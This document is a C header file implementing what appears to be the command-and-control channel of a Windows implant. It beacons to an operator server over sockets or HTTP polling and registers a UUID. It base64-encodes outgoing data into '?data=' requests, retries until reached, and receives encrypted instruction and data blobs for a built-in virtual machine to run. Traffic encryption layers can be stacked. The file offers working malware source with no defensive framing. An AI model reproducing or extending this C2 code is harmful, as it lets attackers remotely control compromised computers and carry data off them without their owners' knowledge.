#ifndef C2_INCLUDED
#define C2_INCLUDED
#define BACKLOG 1000000
#define MAX_RETRIES 3
#include <stdio.h>
#include <windows.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>
#include "utils/sockslib.h"
#include "utils/http.h"
#include "utils/base64.h"
enum C2Types{
    SOCKS,
    HTTP
};
typedef struct c2struct{
    void* pipe;
    unsigned int type;
    unsigned int interval;
    void** cryptRx;
    void** cryptTx;
    const char* uuid;
} C2;
void addRxEnc(C2* conn, int n, ...){
    if(conn->cryptRx != NULL){
        free(conn->cryptRx);
        conn->cryptRx = NULL;
    }
    va_list va;
    va_start(va, n);
    conn->cryptRx = calloc(n + 1, sizeof(void*));
    for(int i=0;i<n;i++)
        (conn->cryptRx)[i] = va_arg(va, void*);
    va_end(va);
}
void addTxEnc(C2* conn, int n, ...){
    if(conn->cryptTx != NULL){
        free(conn->cryptTx);
        conn->cryptTx = NULL;
    }
    va_list va;
    va_start(va, n);
    conn->cryptTx = calloc(n + 1, sizeof(void*));
    for(int i=0;i<n;i++)
        (conn->cryptTx)[i] = va_arg(va, void*);
    va_end(va);
}
void encrypt(C2 conn, char* data, int sz){
    int i = 0;
    if(conn.cryptTx == NULL) return;
    while(conn.cryptTx[i] != NULL){
        void (*encfn)(char*, int) = conn.cryptTx[i];
        (*encfn)(data, sz);
        i++;
    }
}
void decrypt(C2 conn, char* data, int sz){
    int i = 0;
    if(conn.cryptRx == NULL) return;
    while(conn.cryptRx[i] != NULL){
        void (*decfn)(char*, int) = conn.cryptRx[i];
        (*decfn)(data, sz);
        i++;
    }
}
int sendC2(C2 conn, const char* data, unsigned int len){
    char* data2 = calloc(len+1, 1);
    memcpy(data2+1, data, len);
    data2[0] = '\n';
    len++;
    encrypt(conn, data2, len);
    if(conn.type == SOCKS){
        int o = sendsock(data2, conn.pipe, len);
        free(data2);
        return o;
    }else if(conn.type == HTTP){
        char* req = calloc(strlen(conn.pipe)+b64_sz(len)+10, 1);
        strcpy(req, conn.pipe);
        strcat(req, "?data=");
        base64_encode(data2, req+strlen(req), len);
        while(webreq(req, 0, NULL, FALSE) == -1) Sleep(conn.interval);
        free(data2);
        free(req);
        return 0;
    }
    return -1;
}
typedef struct VMstruct{
    int isize;
    unsigned char* instructs;
    int dsize;
    unsigned char* data;
} VMstate;
VMstate recvC2(C2 conn){
    VMstate state;
    if(conn.type == SOCKS){
        state.isize = popsockint(conn.pipe);
        if(state.isize == -1) return state;
        decrypt(conn, (char*)&state.isize, 4);
        
        state.instructs = calloc(state.isize+1, 1);
        if(sockrecv(conn.pipe, state.instructs, state.isize) == -1) goto cleanup_socks;
        decrypt(conn, state.instructs, state.isize);
        
        state.dsize = popsockint(conn.pipe);
        if(state.dsize == -1) goto cleanup_socks;
        decrypt(conn, (char*)&state.dsize, 4);
        state.data = calloc(state.dsize+BACKLOG+1, 1) + BACKLOG;
        if(sockrecv(conn.pipe, state.data, state.dsize) == -1){
            free(state.data - BACKLOG);
            goto cleanup_socks;
        }
        decrypt(conn, state.data, state.dsize);
        return state;
    cleanup_socks:
        free(state.instructs);
        state.isize = -1;
    }else if(conn.type == HTTP){
        const char magic[] = "BEGIN\n";
        static unsigned int pastnum = 0;
        state.isize = -1;
        for(int i=0;i<MAX_RETRIES;i++){
            Sleep(conn.interval);
            char req[1000] = {0};
            sprintf(req, "%s?iv=%d", conn.pipe, conn.interval);
            char* out = calloc(1000000, 1);
            if(webreq(req, 1000000, out, FALSE) == -1)
                goto fin;
            if(memcmp(out, magic, strlen(magic)) != 0){
                state.isize = -2;
                goto fin;
            }
            char* data = calloc(b64d_sz(strlen(out))+100, 1);
            char* od = data;
            base64_decode(out+strlen(magic), data);
            unsigned int num = 0;
            memcpy(&num, data, 4);
            data += 4;
            if(num == pastnum)
                goto fin;
            else
                pastnum = num;
            decrypt(conn, data, b64d_sz(strlen(out)));
            memcpy(&(state.isize), data, 4);
            data += 4;
            state.instructs = calloc(state.isize+1, 1);
            memcpy(state.instructs, data, state.isize);
            
            data += state.isize;
            
            memcpy(&(state.dsize), data, 4);
            data += 4;
            state.data = calloc(state.dsize+BACKLOG+1, 1) + BACKLOG;
            memcpy(state.data, data, state.dsize);
            free(od);
            free(out);
            break;
        fin:
            free(out);
        }
    }
    return state;
}
C2* newC2(int type, const char* uuid, ...){
    va_list va;
    va_start(va, uuid);
    C2* c2 = calloc(sizeof(C2), 1);
    c2->type = type;
    c2->cryptRx = NULL;
    c2->cryptTx = NULL;
    c2->uuid = uuid;
    #define arg(t) va_arg(va, t)
    if(type == SOCKS){
        SOCKET* conn = malloc(sizeof(SOCKET));
        char* nego = arg(char*);
        char* ip = arg(char*);
        int port = arg(int);
        int ival = arg(int);
        int i = 0;
        while(newsock(ip, port, conn)){
            Sleep(ival);
            i++;
            if(i==MAX_RETRIES) return NULL;
        }
        c2->pipe = conn;
        sendC2(*c2, nego, strlen(nego));
        char tempuuid[100] = {0};
        strcpy(tempuuid, uuid);
        tempuuid[strlen(uuid)] = '\n';
        sendC2(*c2, tempuuid, strlen(tempuuid));
    }else if(type == HTTP){
        char* url = arg(char*);
        c2->pipe = calloc(strlen(url)+strlen(uuid)+1, 1);
        strcpy(c2->pipe, url);
        strcat(c2->pipe, uuid);
        c2->interval = arg(int);
    }
    #undef arg
    va_end(va);
    return c2;
}
void cleanC2(C2 conn){
    switch(conn.type){
        case SOCKS:
            closesock(conn.pipe);
            free(conn.pipe);
            break;
        case HTTP:
            free(conn.pipe);
            break;
    }
}
#endif